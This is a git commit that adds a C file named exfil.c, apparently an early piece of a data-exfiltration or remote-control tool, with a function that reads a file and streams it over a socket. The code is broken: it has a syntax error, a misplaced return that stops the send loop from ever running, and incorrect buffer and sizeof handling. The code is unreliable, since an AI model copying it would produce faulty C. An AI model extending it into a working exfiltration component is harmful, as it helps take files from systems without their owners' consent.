786e0edb9a08c55775ed0e46cf3678f4c53cfb76
Lionskey <LoganGoins@protonmail.com>
2023-02-27 17:20:58 -0600

    Added send file function, recv file function on it's way

---
+++ include/exfil.c
@@ -0,0 +1,29 @@
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+#include <arpa/inet.h>
+
+int sendfile(char* file, int sfd){
+  char* sendbuffer[100];
+  int b;
+  char* errbuff = "Error opening file...\n";  
+
+  FILE *fp = fopen(file, "rb");
+  if(fp == NULL){
+       write(sfd, errbuff, sizeof(errbuff); 
+  }    return 2;
+    
+  while( (b = fread(sendbuffer, 1, sizeof(sendbuffer), fp))>0 ){
+        send(sfd, sendbuffer, b, 0);
+  }
+  
+  fclose(fp);
+ 
+  return 0;
+} 
